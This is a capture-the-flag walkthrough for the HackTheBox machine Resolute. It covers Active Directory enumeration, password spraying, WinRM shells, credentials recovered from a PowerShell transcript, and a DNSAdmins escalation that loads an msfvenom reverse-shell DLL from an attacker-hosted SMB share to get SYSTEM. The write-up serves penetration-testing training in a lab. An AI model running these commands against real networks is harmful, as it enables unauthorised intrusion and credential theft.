---
title: "HackTheBox-Resolute"
date: "2020-06-14"
tags: ["hackthebox","blueteam","walkthrough"]
---

## Enumeration

Full nmap scan

```jsx
nmap -A -p- -o nmap.all.tcp 10.10.10.169
```

- A - enable OS, version and script detection (-sV, -sC, -O)
- p- - test all ports

```jsx
...

PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-18 12:10:06Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49709/tcp open  msrpc        Microsoft Windows RPC
54295/tcp open  tcpwrapped

...
```

Due to a poorly configured rpc, we can use rpcclient to connect to the machine using a blank username

```jsx
rpcclient 10.10.10.169 -U ""
rpcclient $> 
```

- U - username

We can then run "enumdomusers" to enumerate the users

```jsx
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

Using ldapsearch I was able to enumerate users and grep for passwords

```jsx
ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" '(objectClass=person)'| grep -i pass
```

- h - host
- x - Simple Authentication
- b - base dn for search

We can then pipe that into grep

```jsx
...

badPasswordTime: 0
description: Account created. Password set to Welcome123!
badPasswordTime: 132345217418993102
badPasswordTime: 0

...
```

Ldapsearch can also be used to enumerate usernames

```jsx
ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" '(objectClass=person)'| grep -i sAMAccountName
```

We can then pipe that into grep

```jsx
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: RESOLUTE$
sAMAccountName: MS02$
sAMAccountName: ryan
sAMAccountName: marko
sAMAccountName: sunita
sAMAccountName: abigail
sAMAccountName: marcus
sAMAccountName: sally
sAMAccountName: fred
sAMAccountName: angela
sAMAccountName: felicia
sAMAccountName: gustavo
sAMAccountName: ulf
sAMAccountName: stevie
sAMAccountName: claire
sAMAccountName: paulo
sAMAccountName: steve
sAMAccountName: annette
sAMAccountName: annika
sAMAccountName: per
sAMAccountName: claude
sAMAccountName: melanie
sAMAccountName: zach
sAMAccountName: simon
sAMAccountName: naoki
```

Generate a file with that list of users

```jsx
cat users
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Use crackmapexec to test the accounts found in using rpcclient or ldapsearch with the password of "Welcome123!"

```jsx
crackmapexec smb 10.10.10.169 -u users -p Welcome123!
```

We get output

```jsx
...

SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123!
```

## Initial Foothold

Now we have the assumed credentials of user "melanie" which we can use to authenticate to the server using winrm

We can use the credentials with the evil-winrm tool ([https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm))

```jsx
evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
```

With this we get a shell!

```jsx
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie> whoami
megabank\melanie
```

And we can grab the user flag

```jsx
*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
87a[REDACTED]
```

## Privilege Escalation 1

Enumerate the users on the box

```jsx
*Evil-WinRM* PS C:\Users\melanie\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
abigail                  Administrator            angela
annette                  annika                   claire
claude                   DefaultAccount           felicia
fred                     Guest                    gustavo
krbtgt                   marcus                   marko
melanie                  naoki                    paulo
per                      ryan                     sally
simon                    steve                    stevie
sunita                   ulf                      zach
The command completed with one or more errors.
```

We can also see what users have logged onto the machine

```jsx
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```

Viewing our group permissions we can see we don't have any access to anything special

```jsx
*Evil-WinRM* PS C:\Users> net user melanie
User name                    melanie
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/21/2020 5:39:04 AM
Password expires             Never
Password changeable          5/22/2020 5:39:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Looking for hidden files in the C: drive we can find a PSTranscripts folder

```jsx
*Evil-WinRM* PS C:\> ls -h

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        5/20/2020   9:26 PM      402653184 pagefile.sys
```

After going into a few more hidden folders we find a PowerShell Transcript file (PowerShell Transcript files record all the activities in the PowerShell console to a text file)

```jsx
*Evil-WinRM* PS C:\PStranscripts\20191203> ls -h

    Directory: C:\PStranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

In this text file we find credentials for a "ryan" user

```jsx
...

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

...
```

We can now login using evil-winrm with ryan

```jsx
evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

We don't find a flag but we do find this note

```jsx
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Running whoami /all as ryan tells us that we're apart of the DNSAdmins group

```jsx
C:\Users\ryan\Documents> whoami /all
...

MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

...
```

Searching about DNSAdmin, I found this privesc post - [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)

Constructing the msfvenom payload

```jsx
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4444 -f dll > privesc.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```

We can then host this using impacket-smbserver 

```jsx
impacket-smbserver exploit ./
```

You can test the server by using net view

```jsx
net view \\10.10.14.51\exploit
net.exe : The Server service is not started.
    + CategoryInfo          : NotSpecified: (The Server service is not started.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2114.
```

But you may get this error, as long as you see the incoming connection on your smbserver, it all works

```jsx
[*] Incoming connection (10.10.10.169,50789)
[*] AUTHENTICATE_MESSAGE (\,RESOLUTE)
[*] User RESOLUTE\ authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:EXPLOIT)
[*] Handle: 'ConnectionResetError' object is not subscriptable
[*] Closing down connection (10.10.10.169,50789)
[*] Remaining connections []
```

Set up your netcat listener

```jsx
nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

Now the next few steps involve you to have quick hands as the settings are reset every minute, the easiest way I found was to have already typed all the commands and just use the arrow keys to go through your history to get through them quickly

Run the dnscmd (don't be worried if you don't see anything contact your smbserver, it's not meant to until you restart dns)

```jsx
dnscmd resolute.megabank.local /config /serverlevelplugindll \\10.10.14.51\exploit\privesc.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Check that the dll has appeared in the registry

```jsx
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

ServerLevelPluginDll : \\10.10.14.58\SHARE\exploit.dll
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
PSChildName          : Parameters
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry
```

Stop and start dns

```jsx
sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 576
        FLAGS              :
```

We should now see something connect to the smbserver and recieve a reverse shell on the listener

```jsx
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:50748.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

And we've got a shell!

```jsx
C:\Users\Administrator\Desktop>type root.txt
type root.txt
e1d[REDACTED]
```
